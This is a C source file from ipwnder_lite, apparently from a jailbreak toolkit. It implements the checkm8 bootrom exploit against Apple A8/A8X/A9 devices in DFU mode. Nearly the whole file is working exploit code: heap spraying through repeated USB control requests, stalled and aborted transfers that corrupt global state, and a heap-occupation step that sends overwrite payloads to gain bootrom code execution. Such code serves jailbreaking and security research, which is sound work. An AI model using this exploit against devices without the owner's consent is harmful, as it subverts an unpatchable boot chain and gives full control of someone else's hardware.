/*
 * ipwnder_lite - ipwndfu_a8_a9.c .. exploit for t7000/t7001/s8000/s8001
 *
 * Copyright (c) 2021 dora2ios
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

#include <io/iousb.h>
#include <common/common.h>

static unsigned char blank[2048];

static void heap_spray(io_client_t client)
{
    transfer_t result;
    UInt32 wLen;
    
    memset(&blank, '\0', 2048);
    
    result = send_data(client, blank, 2048);
    DEBUGLOG("[%s] (1/4) %x", __FUNCTION__, result.ret);
    usleep(1000);
    
    // for iphoneos devices (especially older ones)
    // repeat forever until usb_req_leak() reaches timeout
    int i=0;
    for(i=0;i<16384;i++){
        wLen = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x80, 6, 0x0304, 0x040a, blank, 192, 1);
        result = usb_req_leak(client, blank);
        if(result.ret != kIOReturnSuccess) break;
    }
    DEBUGLOG("[%s] (2/4) %x, %d", __FUNCTION__, result.ret, i);
    
    result = leak(client, blank);
    DEBUGLOG("[%s] (3/4) %x", __FUNCTION__, result.ret);
    
    for(int i=0;i<40;i++){
        result = no_leak(client, blank);
    }
    DEBUGLOG("[%s] (4/4) %x", __FUNCTION__, result.ret);
}

static void set_global_state(io_client_t client)
{
    transfer_t result;
    unsigned int val;
    UInt32 sent;
    
    memset(&blank, '\x41', 2048);
    
    val = 1344; // A8/A8X/A9
    
    int i=0;
    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, 2048, 0)) >= val){
        i++;
        DEBUGLOG("[%s] (*) retry: %x", __FUNCTION__, i);
        usleep(10000);
        result = send_data(client, blank, 64); // send blank data and redo the request.
        DEBUGLOG("[%s] (*) %x", __FUNCTION__, result.ret);
        usleep(10000);
    }
    
    val += 0x40;
    val -= sent;
    DEBUGLOG("[%s] (1/3) sent: %x, val: %x", __FUNCTION__, (unsigned int)sent, val);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, val, 100);
    DEBUGLOG("[%s] (2/3) %x", __FUNCTION__, result.ret);
    
    result = send_abort(client);
    DEBUGLOG("[%s] (3/3) %x", __FUNCTION__, result.ret);
}

static void heap_occupation(io_client_t client, checkra1n_payload_t payload)
{
    transfer_t result;
    
    memset(&blank, '\0', 2048);
    
    result = usb_req_stall(client);
    DEBUGLOG("[%s] (1/6) %x", __FUNCTION__, result.ret);
    usleep(100000);
    
    for(int i=0;i<16;i++){
        result = usb_req_leak(client, blank); // or async_usb_ctrl_transfer_with_cancel
    }
    DEBUGLOG("[%s] (2/6) %x", __FUNCTION__, result.ret);
    usleep(10000);
    
    memset(&blank, '\x41', 2048); // 'A'
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over1, payload.over1_len, 100);
    DEBUGLOG("[%s] (3/6) %x", __FUNCTION__, result.ret);
    
    result = send_data_with_time(client, blank, 256, 100);
    DEBUGLOG("[%s] (4/6) %x", __FUNCTION__, result.ret);
    
    result = send_data_with_time(client, payload.over2, payload.over2_len, 100);
    DEBUGLOG("[%s] (5/6) %x", __FUNCTION__, result.ret);
    
    result = send_abort(client);
    DEBUGLOG("[%s] (6/6) %x", __FUNCTION__, result.ret);
}

int ipwndfu_a8_a9(io_client_t client, checkra1n_payload_t payload)
{
    
    memset(&blank, '\0', 2048);
    
    LOG_EXPLOIT_NAME("checkm8");
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        client = NULL;
        return -1;
    }
    
    LOG("[%s] running heap_spray()", __FUNCTION__);
    heap_spray(client);
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG("[%s] running set_global_state()", __FUNCTION__);
    set_global_state(client);
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG("[%s] running heap_occupation()", __FUNCTION__);
    usleep(10000);
    heap_occupation(client, payload);
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG("[%s] checkmate!", __FUNCTION__);
    
    return 0;
}
